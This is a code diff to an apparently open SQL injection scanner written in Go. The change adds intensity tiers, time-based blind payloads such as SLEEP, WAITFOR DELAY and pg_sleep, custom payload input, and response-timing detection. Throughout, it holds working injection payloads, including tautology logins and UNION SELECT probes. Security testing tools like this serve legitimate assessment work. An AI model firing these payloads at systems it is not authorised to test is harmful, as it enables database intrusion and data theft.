@@ -42,6 +42,7 @@ type SQLScanner struct {
 	MaxDepth    int
 	Throttle    time.Duration
 	Payloads    []string
+	Intensity   int
 }
 
 type sqlCrawlJob struct {
@@ -49,12 +50,50 @@ type sqlCrawlJob struct {
 	Depth int
 }
 
-func NewSQLScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*SQLScanner, error) {
+func NewSQLScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, customPayloads []string) (*SQLScanner, error) {
 	parsed, err := url.Parse(start)
 	if err != nil {
 		return nil, err
 	}
 	client := &http.Client{Timeout: 20 * time.Second}
+
+	payloads := []string{
+		"'",
+		"''",
+		"\"",
+		"\"\"",
+		"\\",
+		"';--",
+		"\") OR 1=1--",
+		"' OR '1'='1",
+		"admin' --",
+		"admin' #",
+		"admin'/*",
+		"1' ORDER BY 1--",
+	}
+
+	if intensity > 2 {
+		payloads = append(payloads, []string{
+			"1' ORDER BY 2--",
+			"1' ORDER BY 3--",
+			"1' UNION SELECT NULL--",
+			"1' UNION SELECT 1,2,3--",
+			"1' GROUP BY 1,2,3--",
+		}...)
+	}
+
+	if intensity > 3 {
+		// Time-based payloads
+		payloads = append(payloads, []string{
+			"'; WAITFOR DELAY '0:0:5'--",
+			"'; SELECT SLEEP(5)--",
+			"'; pg_sleep(5)--",
+		}...)
+	}
+
+	if len(customPayloads) > 0 {
+		payloads = append(payloads, customPayloads...)
+	}
 
 	s := &SQLScanner{
 		StartURL:  parsed,
@@ -66,23 +105,8 @@ func NewSQLScanner(start string, workers, maxPages, maxDepth int, throttle time.
 		MaxPages:  maxPages,
 		MaxDepth:  maxDepth,
 		Throttle:  throttle,
-		Payloads: []string{
-			"'",
-			"''",
-			"\"",
-			"\"\"",
-			"\\",
-			"';--",
-			"\") OR 1=1--",
-			"' OR '1'='1",
-			"admin' --",
-			"admin' #",
-			"admin'/*",
-			"1' ORDER BY 1--",
-			"1' ORDER BY 2--",
-			"1' ORDER BY 3--",
-			"1' UNION SELECT NULL--",
-		},
+		Payloads:  payloads,
+		Intensity: intensity,
 	}
 	return s, nil
 }
@@ -275,22 +299,23 @@ func (s *SQLScanner) fuzzForm(pageURL string, form *goquery.Selection) {
 }
 
 func (s *SQLScanner) testPayload(testURL, param, payload string) bool {
-	resp, body, ok := s.fetch("GET", testURL, nil)
+	resp, body, duration, ok := s.fetch("GET", testURL, nil)
 	if !ok {
 		return false
 	}
-	return s.checkResponse(testURL, param, payload, resp, body)
+	return s.checkResponse(testURL, param, payload, resp, body, duration)
 }
 
 func (s *SQLScanner) testPOSTPayload(testURL, param, payload string, data url.Values) bool {
-	resp, body, ok := s.fetch("POST", testURL, data)
+	resp, body, duration, ok := s.fetch("POST", testURL, data)
 	if !ok {
 		return false
 	}
-	return s.checkResponse(testURL, param, payload, resp, body)
+	return s.checkResponse(testURL, param, payload, resp, body, duration)
 }
 
-func (s *SQLScanner) checkResponse(testURL, param, payload string, resp *http.Response, body string) bool {
+func (s *SQLScanner) checkResponse(testURL, param, payload string, resp *http.Response, body string, duration time.Duration) bool {
+	// 1. Error-based detection
 	errorPatterns := []string{
 		"SQL syntax", "mysql_fetch_array", "ora-", "PostgreSQL query failed",
 		"Microsoft OLE DB Provider for SQL Server", "Incorrect syntax near",
@@ -310,10 +335,27 @@ func (s *SQLScanner) checkResponse(testURL, param, payload string, resp *http.Re
 			return true
 		}
 	}
+
+	// 2. Time-based detection (if intensity > 3)
+	if s.Intensity > 3 {
+		// Threshold: If response is > 4.5 seconds for a payload that shouldn't take that long
+		if duration > 4500*time.Millisecond && (strings.Contains(payload, "SLEEP") || strings.Contains(payload, "DELAY") || strings.Contains(payload, "pg_sleep")) {
+			s.addFinding(FindingSQL{
+				Type:            "Time-based Blind SQL Injection",
+				URL:             testURL,
+				Param:           param,
+				Payload:         payload,
+				Evidence:        fmt.Sprintf("Response took %v", duration),
+				ResponseSnippet: "N/A (Time-based)",
+			})
+			return true
+		}
+	}
+
 	return false
 }
 
-func (s *SQLScanner) fetch(method, target string, data url.Values) (*http.Response, string, bool) {
+func (s *SQLScanner) fetch(method, target string, data url.Values) (*http.Response, string, time.Duration, bool) {
 	if s.Throttle > 0 {
 		time.Sleep(s.Throttle)
 	}
@@ -328,18 +370,22 @@ func (s *SQLScanner) fetch(method, target string, data url.Values) (*http.Respon
 	}
 
 	if err != nil {
-		return nil, "", false
+		return nil, "", 0, false
 	}
 
 	req.Header.Set("User-Agent", "Knife-SQL-Scanner/1.0")
+	
+	start := time.Now()
 	resp, err := s.Client.Do(req)
+	duration := time.Since(start)
+	
 	if err != nil {
-		return nil, "", false
+		return nil, "", 0, false
 	}
 	defer resp.Body.Close()
 
 	bodyBytes, _ := io.ReadAll(resp.Body)
-	return resp, string(bodyBytes), true
+	return resp, string(bodyBytes), duration, true
 }
 
 func (s *SQLScanner) markVisited(u string) bool {
